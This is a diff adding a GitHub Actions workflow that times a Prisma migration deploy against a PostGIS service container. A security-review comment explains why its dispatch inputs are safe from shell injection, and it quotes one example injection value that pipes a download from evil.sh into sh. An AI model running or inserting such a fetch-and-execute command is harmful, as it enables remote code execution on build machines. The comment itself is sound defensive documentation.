@@ -1,0 +1,138 @@
+name: Migration rehearsal
+
+# On-demand only: rehearsal is a deliberate "how long does this take" check
+# run before shipping a migration that touches a large/hot table, not a gate
+# every PR needs. See docs/guides/migrations.md's "Migration rehearsal"
+# section and apps/api/scripts/migration-rehearsal.sh.
+#
+# LOW-1 (2026-08 security review): `time_budget_seconds` and `seed_spec` below
+# are workflow_dispatch inputs that reach `run:` (via env:, see the two steps
+# that consume them) and one `if:` condition. Recorded safe today, and why:
+#
+#   - Trigger is workflow_dispatch only — no `pull_request`/`pull_request_target`,
+#     so only a collaborator with write access (dispatch permission) can supply
+#     these values at all. This is not attacker-controlled input.
+#   - Both inputs reach `run:` via `env:` (`REHEARSAL_TIME_BUDGET_SECONDS`,
+#     `SEED_SPEC_INPUT`), never spliced directly into the script text — the safe
+#     pattern (shell expands an env var's VALUE; it does not re-parse that value
+#     as shell syntax). Direct `${{ github.event.inputs.x }}` interpolation
+#     inside a `run:` block's shell text is the unsafe pattern this avoids: with
+#     env:, a value like `"; curl evil.sh | sh #"` is just an inert string in
+#     `$budget`/`$SEED_SPEC_INPUT`, not executed.
+#   - `time_budget_seconds` is additionally validated as `^[1-9][0-9]*$` before
+#     use (see the `budget` regex check) — belt-and-suspenders on top of the
+#     env: pattern already being safe.
+#   - The `if: ${{ github.event.inputs.seed_spec != '' }}` use is GitHub Actions
+#     *expression* context, not shell — there is no injection surface there
+#     regardless of the input's content.
+#
+# What would make this unsafe, so a future change re-triggers review: widening
+# the trigger to `pull_request`/`pull_request_target` (inputs become
+# attacker-controlled), or a future step that interpolates either input
+# directly into `run:` shell text (`${{ ... }}` inside the script body) instead
+# of via `env:`.
+on:
+  workflow_dispatch:
+    inputs:
+      time_budget_seconds:
+        description: "Max seconds prisma migrate deploy may take (REHEARSAL_TIME_BUDGET_SECONDS)"
+        required: false
+        default: "300"
+      seed_spec:
+        description: "Optional table:count,table:count row-count intent (REHEARSAL_SEED_SPEC)"
+        required: false
+        default: ""
+
+permissions:
+  contents: read
+
+concurrency:
+  group: migration-rehearsal-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  rehearse:
+    name: Rehearse prisma migrate deploy
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    services:
+      postgres:
+        # PostGIS image, matching docker-compose.yml and the other CI lanes
+        # (ci.yml) — same PG16 build the rehearsal script targets locally.
+        image: postgis/postgis:16-3.4
+        env:
+          POSTGRES_DB: trellis_dev
+          POSTGRES_USER: trellis
+          POSTGRES_PASSWORD: trellis_dev_password
+        ports: ["5432:5432"]
+        options: >-
+          --health-cmd "pg_isready -U trellis -d trellis_dev"
+          --health-interval 5s
+          --health-timeout 5s
+          --health-retries 20
+
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+
+      - name: Setup Node.js
+        uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
+        with:
+          node-version: "22"
+          cache: "npm"
+
+      - name: Install dependencies
+        run: npm ci
+
+      - name: Generate Prisma client
+        run: npm run prisma:generate
+        env:
+          DATABASE_URL: postgresql://trellis:trellis_dev_password@localhost:5432/trellis_dev
+
+      # This CI job runs against a `services:` container (already up and
+      # healthy via the options above), not docker-compose — the rehearsal
+      # script's own `docker compose up`/wait logic is for local runs. Time
+      # `prisma migrate deploy` directly here, honoring the same budget/env
+      # contract the script documents, so the workflow and the local script
+      # stay conceptually identical without requiring Docker-in-Docker.
+      - name: Rehearse prisma migrate deploy (timed, budgeted)
+        timeout-minutes: 15
+        run: |
+          set -euo pipefail
+
+          budget="${REHEARSAL_TIME_BUDGET_SECONDS}"
+          if ! [[ "$budget" =~ ^[1-9][0-9]*$ ]]; then
+            echo "migration-rehearsal: time_budget_seconds must be a positive integer, got: ${budget}" >&2
+            exit 2
+          fi
+
+          start_epoch=$(date +%s)
+          set +e
+          (cd apps/api && npx prisma migrate deploy)
+          deploy_status=$?
+          set -e
+          end_epoch=$(date +%s)
+          elapsed=$((end_epoch - start_epoch))
+
+          if [[ "$deploy_status" -ne 0 ]]; then
+            echo "migration-rehearsal: prisma migrate deploy FAILED (exit ${deploy_status}) after ${elapsed}s" >&2
+            exit "$deploy_status"
+          fi
+
+          echo "migration-rehearsal: prisma migrate deploy completed in ${elapsed}s (budget ${budget}s)"
+          if [[ "$elapsed" -gt "$budget" ]]; then
+            echo "migration-rehearsal: OVER BUDGET — ${elapsed}s > ${budget}s. See docs/guides/migrations.md for staged-DDL alternatives." >&2
+            exit 6
+          fi
+          echo "migration-rehearsal: OK — within budget."
+        env:
+          DATABASE_URL: postgresql://trellis:trellis_dev_password@localhost:5432/trellis_dev
+          DIRECT_DATABASE_URL: postgresql://trellis:trellis_dev_password@localhost:5432/trellis_dev
+          REHEARSAL_TIME_BUDGET_SECONDS: ${{ github.event.inputs.time_budget_seconds }}
+
+      - name: Note requested seed spec (informational)
+        if: ${{ github.event.inputs.seed_spec != '' }}
+        run: |
+          echo "migration-rehearsal: seed_spec input was '${SEED_SPEC_INPUT}'."
+          echo "This CI lane times a fresh-schema deploy only; it does not seed representative row counts (that requires a schema-aware seed script — see apps/api/scripts/migration-rehearsal.sh's REHEARSAL_SEED_SQL_SCRIPT). Run the script locally against a populated database for a row-count-aware rehearsal."
+        env:
+          SEED_SPEC_INPUT: ${{ github.event.inputs.seed_spec }}
